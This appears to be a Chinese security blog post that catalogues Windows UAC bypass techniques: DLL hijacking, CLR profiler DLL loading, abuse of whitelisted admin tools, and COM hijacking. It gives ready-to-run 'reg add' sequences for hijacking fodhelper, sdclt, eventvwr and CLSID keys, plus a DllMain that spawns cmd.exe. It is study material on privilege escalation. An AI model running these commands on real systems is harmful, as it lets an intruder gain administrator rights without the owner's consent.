<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Bypass UAC - ConsT27's Blog</title>
    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Bypass UAC", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "UAC", url: "#uac" },
              {title: "autoElevate\u4e0erequestedExecutionLevel", url: "#autoelevaterequestedexecutionlevel" },
              {title: "\u767d\u540d\u5355\u7a0b\u5e8f", url: "#_2" },
              {title: "DLL\u52ab\u6301", url: "#dll" },
              {title: "CLR\u52a0\u8f7d\u4efb\u610fDLL", url: "#clrdll" },
              {title: "\u767d\u540d\u5355\u7a0b\u5e8f", url: "#_3" },
              {title: "\u6ce8\u518c\u8868\u52ab\u6301", url: "#_5" },
              {title: "COM\u52ab\u6301", url: "#com" },
              {title: "\u5229\u7528com\u63a5\u53e3", url: "#com_1" },
              {title: "UACME", url: "#uacme" },
          ]},
          {title: "windbg\u8c03\u8bd5", url: "#windbg", children: [
          ]},
        ];

    </script>
    <script src="../../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/" class="btn btn-xs btn-link">
        Windows下可提权的九种权限
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Windows%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Windows%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
        Windows提权
      </a>
    </div>
    
  </div>

    

    <h1 id="bypass-uac">Bypass UAC</h1>
<h2 id="_1">目录</h2>
<ul>
<li><a href="#UAC">UAC</a></li>
<li><a href="#autoElevate与requestedExecutionLevel">autoElevate与requestedExecutionLevel</a><ul>
<li><a href="#autoElevate">autoElevate</a></li>
<li><a href="#requestedExecutionLevel">requestedExecutionLevel</a></li>
</ul>
</li>
<li><a href="#白名单程序">白名单程序</a></li>
<li><a href="#DLL劫持">DLL劫持</a><ul>
<li><a href="#实践出真知1">实践出真知1</a></li>
<li><a href="#实践出真知2">实践出真知2</a></li>
</ul>
</li>
<li><a href="#CLR加载任意DLL">CLR加载任意DLL</a></li>
<li><a href="#白名单程序">白名单程序</a><ul>
<li><a href="#odbcad32exe">odbcad32.exe</a></li>
<li><a href="#管理工具">管理工具</a></li>
</ul>
</li>
<li><a href="#注册表劫持">注册表劫持</a><ul>
<li><a href="#Fodhelperexe">Fodhelper.exe</a></li>
<li><a href="#sdclt">sdclt</a></li>
<li><a href="#eventvmr">eventvmr</a></li>
</ul>
</li>
<li><a href="#COM劫持">COM劫持</a></li>
<li><a href="#利用com接口">利用com接口</a><ul>
<li><a href="#ICMLuaUtil">ICMLuaUtil</a></li>
</ul>
</li>
<li><a href="#UACME">UACME</a></li>
<li><a href="#windbg调试">windbg调试</a></li>
</ul>
<h2 id="uac">UAC</h2>
<p>用户帐户控制（User Account Control，简写作UAC)是<a href="https://baike.baidu.com/item/微软" title="微软">微软</a>公司在其[Windows Vista](<a href="https://baike.baidu.com/item/Windows" title="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。
管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。</p>
<p><img alt="image-20210227191310985" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210227191310985.png" title="image-20210227191310985" /></p>
<p>点击“是”，管理员就会提升到高权限再去运行该任务。</p>
<h2 id="autoelevaterequestedexecutionlevel">autoElevate与requestedExecutionLevel</h2>
<h3 id="autoelevate">autoElevate</h3>
<p>当某个EXE文件的文件清单里有\<autoElevate> 元素时，当执行该文件时会默认提权执行。
我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。
适用范围:管理员权限以获得，要得到高权限管理员权限</p>
<p>一般用工具sigcheck检测</p>
<p>网上常拿C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 举列子</p>
<p><img alt="image-20210301000136728" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000136728.png" title="image-20210301000136728" /></p>
<p><img alt="image-20210301000141880" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000141880.png" title="image-20210301000141880" /></p>
<p>这个东西很有用，是下面部分方法的前提条件</p>
<h3 id="requestedexecutionlevel">requestedExecutionLevel</h3>
<p><img alt="image-20210302125607741" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125607741.png" title="image-20210302125607741" /></p>
<p>有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行</p>
<p>asInvoker：父进程是什么权限，此应用程序就是什么权限</p>
<p>requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记</p>
<p><img alt="image-20210302125851318" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125851318.png" title="image-20210302125851318" /></p>
<p>highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出UAC框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行</p>
<h2 id="_2">白名单程序</h2>
<p>除了刚刚说的autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖CLR支持（如事件查看器，任务计划程序）</p>
<h2 id="dll">DLL劫持</h2>
<p>reference:<a href="https://www.anquanke.com/post/id/209033" title="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a>
<a href="https://www.cnblogs.com/0daybug/p/11719541.html" title="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p>
<p>exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是</p>
<ul>
<li>程序所在目录</li>
<li>系统目录即<code>SYSTEM32</code>目录</li>
<li>16位系统目录即<code>SYSTEM</code>目录</li>
<li><code>Windows</code>目录</li>
<li>程序加载目录(<code>SetCurrentDirecctory</code>)</li>
<li>
<p><code>PATH</code>环境变量中列出的目录
    同时，dll加载也遵循着<code>Know DLLs注册表项</code>的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS处可以看见这些dll</p>
<p><img alt="image-20210301184035776" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301184035776.png" title="image-20210301184035776" /></p>
</li>
</ul>
<p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。</p>
<p>如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：</p>
<p>（1） DLL替换：用恶意的DLL替换掉合法的DLL
（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。
（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL
（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。
（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载
（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p>
<h4 id="1">实践出真知1</h4>
<p>这里我们先用第一种方法来进行实验，实验对象是C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。</p>
<p><img alt="image-20210302132631680" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132631680.png" title="image-20210302132631680" /></p>
<p>由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口</p>
<p><img alt="image-20210302132724843" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132724843.png" title="image-20210302132724843" /></p>
<p>bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。</p>
<h4 id="2">实践出真知2</h4>
<p>这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。</p>
<p>我们process monitor设置过滤如下</p>
<p><img alt="image-20210302205938167" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302205938167.png" title="image-20210302205938167" /></p>
<p>cmd运行 mmc eventvwr.msc,查看调用</p>
<p><img alt="image-20210302210053342" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302210053342.png" title="image-20210302210053342" /></p>
<p>dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。</p>
<p>我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行</p>
<p>但是无奈我这里环境是win7 sp1,但是这个洞7600才出现，所以复现不了了。但大概思路就是这样的</p>
<h2 id="clrdll">CLR加载任意DLL</h2>
<p>CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。</p>
<p>至于这个dll如何给CLR，是通过修改以下环境变量实现的</p>
<pre><code class="language-纯文本">COR_ENABLE_PROFILING = 1

COR_PROFILER={CLSIDor ProgID}
</code></pre>
<p>CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。
在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载
net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。
总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。</p>
<p>接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。
以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system("cmd.exe")  那么就会蹦出来高权限cmd窗口</p>
<pre><code class="language-纯文本">REG ADD &quot;HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\test\calc.dll&quot; /f
REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}&quot; /f
REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f
mmc gpedit.msc
</code></pre>
<p>但我死活复现不起不知道为啥，我的dll这样写的</p>
<pre><code class="language-纯文本">// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include &quot;pch.h&quot;
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    char cmd[] = &quot;cmd.exe&quot;;

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        WinExec(cmd, SW_SHOWNORMAL);
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</code></pre>
<p>另外的，你还可以为COR_PROFILER_PATH设置为如\\server\share\test.dll的smb的路径，这样也可以实现bypassuac（没复现）</p>
<h2 id="_3">白名单程序</h2>
<h3 id="odbcad32exe">odbcad32.exe</h3>
<p>这个方法很简单。打开C:\Windows\system32\odbcad32.exe，然后通过以下方法打开powershell或者cmd</p>
<p><img alt="image-20210302133941728" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302133941728.png" title="image-20210302133941728" /></p>
<p>成功bypass</p>
<p><img alt="image-20210302134014137" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302134014137.png" title="image-20210302134014137" /></p>
<h3 id="_4">管理工具</h3>
<p>之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例</p>
<p>操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell    以此内推，还有很多相似的管理工具可以这样利用</p>
<h2 id="_5">注册表劫持</h2>
<h3 id="fodhelperexe">Fodhelper.exe</h3>
<p>Fodhelper.exe win10才有，所以只有win10能通过这个办法bypassuac，他是一个autoelevate元素程序</p>
<p>我们使用proceemonitor查看事件查看器启动的时候执行了什么。我们通过排查发现了此处</p>
<p><img alt="image-20210302194843185" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302194843185.png" title="image-20210302194843185" /></p>
<p>发现程序试图打开HKCU\Software\Classes\ms-settings\shell\open\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\ms-settings\Shell\Open,查询成功便打开其下的Command键进行查询。
我们可以劫持注册表，往HKCU\Software\Classes\ms-settings\shell\open\command写入恶意指令从而达到bypassuac的目的。</p>
<pre><code class="language-纯文本">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f 
reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
</code></pre>
<p>我们写入如下命令，就能让Fodhelper.exe 执行时自动高权限执行cmd窗口了</p>
<p>然后消除痕迹</p>
<pre><code class="language-纯文本">reg delete &quot;HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command&quot;
</code></pre>
<h3 id="sdclt">sdclt</h3>
<p>Win10后这个程序才有自动提升权限的能力</p>
<pre><code class="language-纯文本">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d C:\Windows\System32\cmd.exe /f 
reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /v &quot;DelegateExecute&quot; /f

</code></pre>
<p><img alt="image-20210302201240945" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302201240945.png" title="image-20210302201240945" /></p>
<h3 id="eventvmr">eventvmr</h3>
<pre><code class="language-纯文本">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /d C:\Windows\System32\cmd.exe /f
</code></pre>
<p>win10，win7均无效,不知道是哪个版本的事了，反正记录下来吧。</p>
<h2 id="com">COM劫持</h2>
<p>和dll劫持类似，应用程序在运行时也会去加载指定CLSID的COM组件，其加载顺序如下</p>
<pre><code class="language-纯文本">HKCU\Software\Classes\CLSID
HKCR\CLSID
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\
</code></pre>
<p>以eventvwr为例</p>
<p>执行该程序时会去寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，这个组件又需要加载InProcServer32指定的DLL，而这个DLL的路径可由用户定义。</p>
<p>而eventvwr的这个组件一般在HKCR\CLSID找到，所以可以搜索路径劫持。</p>
<p>利用以下方法可以劫持（搜索路径劫持）</p>
<pre><code class="language-纯文本">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;&quot; /t REG_SZ /d &quot;d:\msf_x64.dll&quot; /f 

reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;LoadWithoutCOM&quot; /t REG_SZ /d &quot;&quot; /f 

reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;ThreadingModel&quot; /t REG_SZ /d &quot;Apartment&quot; /f 

reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &quot;HideOnDesktop&quot; /t REG_SZ /d &quot;&quot; /f 

reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &quot;Attributes&quot; /t REG_DWORD /d 0xf090013d /f
</code></pre>
<h2 id="com_1">利用com接口</h2>
<h3 id="icmluautil">ICMLuaUtil</h3>
<p><img alt="image-20210304122737764" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210304122737764.png" title="image-20210304122737764" /></p>
<h2 id="uacme">UACME</h2>
<p>一个开源项目，记录了许多Bypassuac的方法。</p>
<p><a href="https://github.com/hfiref0x/UACME/tree/v3.2.x" title="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p>
<h1 id="windbg">windbg调试</h1>
<p>大家自己找资料玩，因为我也不会</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/" class="btn btn-xs btn-link">
        Windows下可提权的九种权限
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Windows%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Windows%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
        Windows提权
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>